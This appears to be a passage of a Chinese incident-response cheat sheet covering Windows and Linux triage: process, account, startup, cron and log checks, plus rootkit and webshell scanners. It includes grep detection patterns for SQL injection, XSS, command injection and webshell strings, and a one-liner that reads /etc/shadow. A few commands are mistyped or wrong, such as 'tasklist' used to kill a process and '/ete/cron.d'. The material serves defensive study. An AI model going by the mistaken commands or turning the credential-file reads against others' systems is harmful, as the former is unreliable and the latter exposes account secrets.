+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(1)查看端口得到PID</span><br><span class="line">netstat -nao | findstr 端口</span><br><span class="line"></span><br><span class="line">(2)根据PID查看进程对应的程序名称</span><br><span class="line">tasklist /V | findstr PID</span><br><span class="line">wmic process list brief | findstr PID</span><br><span class="line"></span><br><span class="line">(3)得到程序全路径名</span><br><span class="line">wmic process where processid=PID get processid,executablepath,name</span><br><span class="line"></span><br><span class="line">(4)杀掉进程</span><br><span class="line">tasklist /pid PID /f</span><br><span class="line">wmic process where name="mysqld.exe" delete</span><br><span class="line">wmic process where processid=PID call terminate</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="自启动、计划任务"><a href="#自启动、计划任务" class="headerlink" title="自启动、计划任务"></a>自启动、计划任务</h3><ol>
+<li>新增、隐藏账号排查</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(1)通过命令：“net user”查看</span><br><span class="line">(2)通过“计算机管理”查看。				lusrmgr.msc</span><br><span class="line">(3)通过Windows安全日志进行排查		eventvwr</span><br><span class="line">(4)通过查看注册表文件进行排查		  regedit</span><br><span class="line"></span><br><span class="line">#1 HKEY CLASSES ROOT(HKCR)</span><br><span class="line">#2 HKEY CURRENT USER(HKCU)</span><br><span class="line">#3 HKEY LOCAL MACHINE(HKLM)</span><br><span class="line">#4 HKEY USERS(HKU)</span><br><span class="line"></span><br><span class="line">(5)通过Windows管理工具</span><br><span class="line">wmic useraccount get name,SiD</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>注册表排查</li>
+</ol>
+<p>（1）在注册表此处查看是否有隐藏账户或者影子账号</p>
+<p>HKEY_LOCAL_MACHINE——SAM——Account——Users——Names</p>
+<p><img src="https://pic1.imgdb.cn/item/67f7cae788c538a9b5c8f67f.png"></p>
+<p>（2）在注册表此处查看启动项（2种）</p>
+<p>HKEY_LOCAL_MACHINE——SOFTWARE——Microsoft——Windows——CurrentVersion——Run</p>
+<p>HKEY_CURRENT_USER——Software——Microsoft——Windows——CurrentVersion——Run</p>
+<p>（3）计划任务查看</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks.exe</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="Linux排查"><a href="#Linux排查" class="headerlink" title="#Linux排查"></a>#Linux排查</h2><h3 id="关键目录"><a href="#关键目录" class="headerlink" title="关键目录"></a>关键目录</h3><table>
+<thead>
+<tr>
+<th align="center">文件名</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">/etc/passwd</td>
+<td align="center">用户信息文件</td>
+</tr>
+<tr>
+<td align="center">/etc/rc.d/rc.local</td>
+<td align="center">开机启动项</td>
+</tr>
+<tr>
+<td align="center">/root/.ssh</td>
+<td align="center">root用户ssh公钥和私钥</td>
+</tr>
+<tr>
+<td align="center">/tmp</td>
+<td align="center">系统或用户临时文件目录</td>
+</tr>
+<tr>
+<td align="center">/etc/hosts</td>
+<td align="center">本地IP地址域名解析文件</td>
+</tr>
+<tr>
+<td align="center">/etc/init.d/</td>
+<td align="center">开机启动项</td>
+</tr>
+</tbody></table>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、ls -alt</span><br><span class="line"></span><br><span class="line">2、free -h：查看系统内存使用情况</span><br><span class="line"></span><br><span class="line">3、ps auxf ：查看系统进程及子进程		</span><br><span class="line">top ：查看CPU占用率				//排查CPU占用率最高的进程</span><br><span class="line"></span><br><span class="line">4、netstat -antpl</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/67f7cb0388c538a9b5c8f6c1.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">5、lsof -i:port		//查询端口打开的文件</span><br><span class="line">lsof -p pid			//查询进程打开的文件	</span><br><span class="line">lsof -u root		//查询用户打开的文件</span><br><span class="line"></span><br><span class="line">6、chattr			//修改文件属性，防止误删除</span><br><span class="line">chattr +i 文件夹	加锁</span><br><span class="line">chattr -i 文件夹	去锁</span><br><span class="line">lsattr				//显示文件属性</span><br><span class="line"></span><br><span class="line">7、排查启动项</span><br><span class="line">cat /etc/rc.local</span><br><span class="line">ls -alt /etc/profile.d/*.sh		//sh文件在启动之后会自动加载</span><br><span class="line"></span><br><span class="line">8、grep		//查找符合条件的字符串</span><br><span class="line"></span><br><span class="line">9、查看计划任务</span><br><span class="line">cat /etc/passwd | cut -f 1 -d : |xargs -l {} crontab -l -u {}	//查询所有用户的计划任务</span><br><span class="line">ls -altr /var/spool/cron/*</span><br><span class="line">more /etc/crontab</span><br><span class="line">more /ete/cron.d/*</span><br><span class="line">more /etc/cron.daily/*</span><br><span class="line">more /etc/cron.hourly/*</span><br><span class="line">more /etc/cron.monthly/*</span><br><span class="line">more /etc/cron.weekly/</span><br><span class="line">more /etc/anacrontab</span><br><span class="line">more /var/spool/anacron/*</span><br><span class="line"></span><br><span class="line">10、查看历史命令</span><br><span class="line">history</span><br><span class="line">cat ~/.bash_history		//每个用户都有对应的记录</span><br><span class="line"></span><br><span class="line">11、校验RPM软件包</span><br><span class="line">rpm -Va</span><br><span class="line">dpkg -verify</span><br><span class="line">重点关注一下SM5 看是否存在文件权限和所有权不一致</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/67f7cb1f88c538a9b5c8f6e5.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">12、查看文件（文件夹）详细信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">13、查看文件的时间</span><br><span class="line">find / -mtime 0 -name *.jsp		//查看当前目录下，指定天数内修改的指定类型文件（文件内容的修改）</span><br><span class="line">find / -ctime 0 -name *.jsp		//查看当前目录下，指定天数内新增的指定类型文件（文件类型的修改）</span><br><span class="line"></span><br><span class="line">14、比较文件差异</span><br><span class="line">diff -c</span><br><span class="line"></span><br><span class="line">15、查看隐藏进程（3步结合）</span><br><span class="line">ps -ef | awk '{print $2}' | sort -n | uniq &gt; ps.p	//导出所有的PID号到ps.p</span><br><span class="line">ls /proc | sort -n | uniq &gt; proc.p					//导出所有的进程文件号打印出来</span><br><span class="line">diff ps.p proc.p									//比较区别</span><br><span class="line"></span><br><span class="line">16、查看用户登录历史记录</span><br><span class="line">last</span><br><span class="line"></span><br><span class="line">17、查看用户登陆失败记录</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">18、查看用户最近一次登录信息		//会显示/etc/passwd中所有用户的最近登录信息</span><br><span class="line">lastlog</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h3><h4 id="Busybox"><a href="#Busybox" class="headerlink" title="Busybox"></a>Busybox</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./busybox netstat -antlp </span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="unhide"><a href="#unhide" class="headerlink" title="unhide"></a>unhide</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一款检测发现那些借助rootkit及其它技术隐藏的进程和TCP/UDP端口的命令行工具</span><br><span class="line">可以判断系统是否存在隐藏进程</span><br><span class="line"></span><br><span class="line">unhide proc		//检测隐藏进程</span><br><span class="line">unhide sys		//检测隐藏系统文件</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h4><p>rootkit是Linux平台下最常见的一种木马后门工具，它主要通过替换系统文件来达到入侵和隐蔽的目的，这种木马比普通木马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木马。rootkit攻击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻击者保住权限，以使它在任何时候都可以使用root权限登录到系统。</p>
+<ul>
+<li>rootkit主要有两种类型：<strong>文件级别</strong>和<strong>内核级别</strong></li>
+</ul>
+<ol>
+<li>文件级别的rootkit:</li>
+</ol>
+<p>​		一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。在系统遭受rootkit攻击后，合法的文件被木马程序替代，变成了外壳程序，而其内部是隐藏着的后门程序。通常容易被rootkit替换的系统程序有login、ls、ps、ifconfig、du、find、netstat等。文件级别的rootkit，对系统维护很大，目前最有效的防御方法是定期对系统重要文件的完整性进行检查，如Tripwire、aide等。</p>
+<ol start="2">
+<li>内核级别rootkit：</li>
+</ol>
+<p>​		是比文件级rootkit更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级rootkit主要依附在内核上，它并不对系统文件做任何修改。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit是一款用于UNIX/Linux的本地rootkit检查工具，用于检查系统上已知的rootkit。它通过检查通常与rootkit相关的特定文件、目录和字符串，扫描系统以查找rootkit安装的任何迹象</span><br><span class="line">检测是否被植入后门、木马、rootkit</span><br><span class="line"></span><br><span class="line">直接运行/usr/local/chkrootkit/chkrootkit</span><br><span class="line">在kail中自带，可以使用chkrootkit -n</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Rkhunter"><a href="#Rkhunter" class="headerlink" title="Rkhunter"></a>Rkhunter</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rkhunter是Linux系统平台下的一款开源入侵检测工具，具有非常全面的扫描范围，除了能够检测各种已知的rootkit特征码以外，还支持端口扫描、常用程序文件的变动情况检查。</span><br><span class="line"></span><br><span class="line">rkhunter --check --sk</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行rkhunter检查系统它主要执行下面一系列的测试:</p>
+<pre><code>1. MD5校验测试, 检测任何文件是否改动.
+2. 检测rootkits使用的二进制和系统工具文件.
+3. 检测特洛伊木马程序的特征码.
+4. 检测大多常用程序的文件异常属性.
+5. 执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台.
+6. 扫描任何混杂模式下的接口和后门程序常用的端口.
+7. 检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告.
+8. 对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等.
+</code></pre>
+<h4 id="ClamAV"><a href="#ClamAV" class="headerlink" title="ClamAV"></a>ClamAV</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一款用于检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎。</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="WebShell查杀-河马"><a href="#WebShell查杀-河马" class="headerlink" title="WebShell查杀-河马"></a>WebShell查杀-河马</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.shellpub.com/</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="内存马查杀-java-memshell-scanner"><a href="#内存马查杀-java-memshell-scanner" class="headerlink" title="内存马查杀-java-memshell-scanner"></a>内存马查杀-java-memshell-scanner</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志存放位置</p>
+<p>/www/admin/localhost</p>
+<h4 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">(1)列出当天访问次数最多的IP命令(确认攻击者IP)</span><br><span class="line">cut -d- -f 1 log_file | uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">cut -d- -f 1 log_file:</span><br><span class="line">	cut 命令提取文件 log_file 中的内容。</span><br><span class="line">	-d- 指定 - 作为字段分隔符。</span><br><span class="line">	-f 1 表示提取每行的第一个字段。</span><br><span class="line">	这部分的意义是从 log_file 中提取每行 - 分隔符前面的内容。</span><br><span class="line">uniq -c:</span><br><span class="line">	uniq 命令用于过滤掉重复的行。</span><br><span class="line">	-c 选项使 uniq 在输出的每一行前加上该行出现的次数。</span><br><span class="line">	这部分会统计 cut 提取出来的第一个字段的出现次数。</span><br><span class="line">sort -rn:</span><br><span class="line">	sort 命令用于对输入的行进行排序。</span><br><span class="line">	-r 选项表示逆序排序（从大到小）。</span><br><span class="line">	-n 选项表示按照数值进行排序，而不是字典序。</span><br><span class="line">	这部分的作用是将 uniq 输出的行按照出现次数进行降序排列。</span><br><span class="line">head -20:</span><br><span class="line">	head 命令用于输出前 N 行。</span><br><span class="line">	-20 表示输出前 20 行。</span><br><span class="line">	这一部分会最终列出出现次数最多的前 20 个字段。</span><br><span class="line"></span><br><span class="line">(2)查看每一个IP访问了多少个页面</span><br><span class="line">awk '{++S[$1]} END {for (a in S) print a, S[a]}' log_file  </span><br><span class="line"></span><br><span class="line">awk '{++S[$1]}' log_file:</span><br><span class="line">	awk 是一个强大的文本处理工具。</span><br><span class="line">	{++S[$1]}：每当读取到一行，$1 表示该行的第一个字段。S[$1] 是一个 associative array（关联数组），用于记录第一个字段出现的次数。++S[$1] 对该字段的计数加 1。</span><br><span class="line">	log_file 是要处理的文件。</span><br><span class="line">END {for (a in S) print a, S[a]}:</span><br><span class="line">	END {...} 块在输入文件的所有行处理完后执行。</span><br><span class="line">	for (a in S) 遍历数组 S，其中 a 是数组中的每一个键（即第一个字段的不同值）。</span><br><span class="line">	print a, S[a]：打印出字段 a 和它的计数 S[a]。</span><br><span class="line"></span><br><span class="line">(3)看某一个页面被访问的次数(确认木马文件)</span><br><span class="line">grep "/index.php" log_file | wc -l</span><br><span class="line"></span><br><span class="line">grep "/index.php" log_file：从名为 log_file 的日志文件中查找包含 /index.php 的所有行。grep 是一个用于文本搜索的命令，它会返回所有匹配的行。</span><br><span class="line">|：这个符号是管道操作符，它将前一个命令的输出传递给后一个命令。</span><br><span class="line">wc -l：wc 是一个用于计算文本行数、单词数和字节数的命令。选项 -l 表示只计算行数。</span><br><span class="line"></span><br><span class="line">(4)查看某一个IP访问了哪些页面</span><br><span class="line">grep 192.168.1.132 log_file | awk '{print $1,$7}'</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>常用命令：find、awk、cat、grep</p>
+<p>find：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(1)find 文件名</span><br><span class="line">-name：区分大小写</span><br><span class="line">-iname：不区分大小写</span><br><span class="line">find -name "*.php"</span><br><span class="line">find -type f -name "*.php" | xargs grep 'eval' | more	//查看php文件中包含eval的文件内容</span><br><span class="line"></span><br><span class="line">(2)find 文件类型</span><br><span class="line">-type：f(普通文件) d(目录) i(软链接)</span><br><span class="line"></span><br><span class="line">(3)按照文件大小</span><br><span class="line">-size: +50k(找比50k大的文件) -100k(找比100k小的文件)		//M、G为大写，k为小写</span><br><span class="line"></span><br><span class="line">(4)按照修改时间</span><br><span class="line">-atime(访问时间)	-mtime(最后修改内容的时间)	-ctime(文件的状态改变时间（例如，权限修改，文件名更改等），除了文件内容修改的)</span><br><span class="line">+5：6天前修改的文件		20号（今天）--&gt; 14号之前修改的文件</span><br><span class="line">-5：5天内修改的文件		20号（今天）--&gt; 15-20号修改的文件</span><br><span class="line">5：精确到5天前		 20号（今天）--&gt; 15号修改的文件</span><br><span class="line">find -mtime 0 -name "*.php"		//24h内修改的文件</span><br><span class="line"></span><br><span class="line">(5)权限</span><br><span class="line">-perm:查看权限</span><br><span class="line">find -iname "*.php" -perm 777</span><br><span class="line"></span><br><span class="line">(6)所属组所有者</span><br><span class="line">-uid</span><br><span class="line">-gid</span><br><span class="line">-user 用户名</span><br><span class="line">-nouser	没有所属组的文件</span><br><span class="line">find -user root		//查找哪些文件是root的</span><br><span class="line">find -nouser		//查找没有所有者的文件，看是不是外来垃圾文件</span><br><span class="line"></span><br><span class="line">(7)逻辑运算</span><br><span class="line">-a:	逻辑与(&amp;)</span><br><span class="line">-o:逻辑或(|)</span><br><span class="line">-not:逻辑非</span><br><span class="line">find -mtime -3 -a -perm 777 	//3天内权限为777的文件</span><br><span class="line">find -name php -o -name jsp		//文件为php或jsp的</span><br></pre></td></tr></tbody></table></figure>
+
+<p>awk：awk [选项]’匹配规则处理规则’ 路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">匹配规则：正则表达式</span><br><span class="line">处理规则：设置变量、数组，定义函数，加减运算，字符串拼接</span><br><span class="line">联合sort -n去排序,uniq去除重复行配上-c计数参数</span><br><span class="line">sort -n | uniq &gt; 1 -c</span><br><span class="line">$1:第一列</span><br><span class="line"></span><br><span class="line">awk '{print substr($4,2,11)}' log_file | sort | uniq -c</span><br><span class="line"></span><br><span class="line">-F:指定分隔符，默认为空格</span><br><span class="line">awk -F: 'length($2)==0 {print $1}' /etc/shadow</span><br></pre></td></tr></tbody></table></figure>
+
+<p>grep：查找文件中的字符内容</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-c:统计行数</span><br><span class="line">-v:去掉这一行的内容打印</span><br><span class="line">ps -ef | grep ssh | grep -v grep</span><br><span class="line"></span><br><span class="line">ps -ef：这个命令用于显示系统中所有进程的详细信息。</span><br><span class="line">	-e 选项表示显示所有用户的所有进程。</span><br><span class="line">	-f 选项表示以完整格式（full format）显示进程信息，包括 UID、PID、PPID、C、STIME、TTY、TIME 和 CMD 等字段。</span><br><span class="line">|：这个管道符号将前一个命令的输出传递给下一个命令。</span><br><span class="line">grep ssh：这个命令过滤出包含 "ssh" 字符串的行。这意味着它会找出所有 SSH 相关的进程。</span><br><span class="line">grep -v grep：这个命令会排除任何包含 "grep" 字符串的行。因为在使用 grep 时，该命令本身也会被列为一个进程，使用 -v 选项可以反向匹配，从而过滤掉这行。</span><br><span class="line"></span><br><span class="line">find ./ -name "*.php" | xargs grep "eval()"</span><br><span class="line">	xargs:用于将输入转换为命令行参数，并执行后面的命令。</span><br><span class="line">	</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(1)SQL注入检攻击检测</span><br><span class="line">grep -E -i "select" log1</span><br><span class="line">	-E：这个选项表示使用扩展的正则表达式 (Extended Regular Expression)。这使您能够使用一些额外的正则表达式特性，例如 +、? 等。</span><br><span class="line">	-i：此选项表示不区分大小写，即在搜索时 "select" 会匹配 "SELECT"、"Select" 等不同大小写的形式。</span><br><span class="line"></span><br><span class="line">(2)xss跨站脚本攻击检测</span><br><span class="line">grep -E -i " (S)%26%23x3c%3B(S+)%3E|(S)%26%23x3c%3B(S+)%2F%3E|(S+)&amp;#x3c;(S+)&gt;|(S+)&amp;#x3c;(S+)/" log1</span><br><span class="line"></span><br><span class="line">(S)%26%23x3c%3B(S+):</span><br><span class="line">	%26%23x3c 是 HTML 实体，表示 &lt; 符号。也就是说，该部分寻找形如 S&lt;S+ 的字符串。</span><br><span class="line">|: 逻辑“或”操作符，用于连接多个表达式。</span><br><span class="line">(S)%26%23x3c%3B(S+)/:</span><br><span class="line">	这个部分类似于前面的，但它表示寻找形如 S&lt;S+/ 的字符串（即自闭合标签）。</span><br><span class="line">(S+)&amp;#x3c;(S+)&gt;:</span><br><span class="line">	这里找到的是 S&lt;S+&gt; 的形状，这里 &amp;#x3c; 同样表示 &lt;。</span><br><span class="line">(S+)&amp;#x3c;(S+)/:</span><br><span class="line">	F这个部分寻找传递形如 S&lt;S+/ 的字符串。</span><br><span class="line"></span><br><span class="line">(3)命令注入攻击攻击检测</span><br><span class="line">grep -E -i "ping%20-c%20|ls%20|cat%20|%20pwd|net user" log1</span><br><span class="line"></span><br><span class="line">(4)网站被植入webshell后门检测</span><br><span class="line">grep -E -i "eval|%eval|%execute|%3binsert|%20makewebtaski|/1.asp|/1.jsp|/1.php|/1.aspx %if" log1</span><br><span class="line"></span><br><span class="line">(5)暴力破解账号攻击检测</span><br><span class="line">grep -E -i "login" /www/logs/access.log | grep -E -i "POST" | grep -E -i "200"</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="系统日志-1"><a href="#系统日志-1" class="headerlink" title="系统日志"></a>系统日志</h4><table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">/var/log/cron</td>
+<td align="center">定时任务相关日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/cups</td>
+<td align="center">打印信息的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/dmeslog</td>
+<td align="center">系统在开机时内核自检的信息</td>
+</tr>
+<tr>
+<td align="center">/var/log/auth.log</td>
+<td align="center">系统授权信息，用户登录和使用的权限机制等</td>
+</tr>
+<tr>
+<td align="center">/var/log/message</td>
+<td align="center">系统重要信息的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/btmp</td>
+<td align="center">错误登录日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/lastlog</td>
+<td align="center">系统中所有用户最后一次登录时间的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/wtmp</td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件</td>
+</tr>
+<tr>
+<td align="center">/var/log/utmp</td>
+<td align="center">当前已经登录的用户信息</td>
+</tr>
+</tbody></table>
+<p>系统安全安全日志</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure 		Centos</span><br><span class="line"></span><br><span class="line">Apr 17 10:25:37 VM-0-17-centos sshd[18083]:Accepted publickey for root from 45.79.126.79 port 5729 ssh2: RSA SHA256:av1LzEMVmLIn1gDyaaMc8LWyqx6KGLzjRa57Zvx7+ac</span><br><span class="line">-Apr1710:25:37：事件发生的日期和时间，以月、日、小时和分钟的格式表示。</span><br><span class="line">-VM-0-17-centos：事件发生的机器的主机名。</span><br><span class="line">-sshd[18083]:服务的名称(sshd）和与事件相关的进程ID(18083）。</span><br><span class="line">-Acceptedpublickey：公钥身份验证成功。</span><br><span class="line">-for root：验证的用户帐户是root。</span><br><span class="line">-from 45.79.126.79 port 5729 	ssh2:来自IP地址45.79.126.79且SSH连接的端口是5729。</span><br><span class="line"></span><br><span class="line">查找每个IP地址的失败登录次数：</span><br><span class="line">awk '/sshd.*Failed/{print $(NF-3)}' /var/log/secure | sort | uniq -c| sort -nr</span><br><span class="line"></span><br><span class="line">查找特定IP地址的失败登录：</span><br><span class="line">grep "sshd.*Failed.*from &lt;IP_ADDRESS&gt;" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</span><br><span class="line"></span><br><span class="line">查找特定IP地址的成功登录：</span><br><span class="line">grep "sshd.*Accepted.*from &lt;IP_ADDRESS&gt;" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat /var/log/auth.log 		Ubuntu</span><br><span class="line"></span><br><span class="line">vim /etc/rsyslog.conf 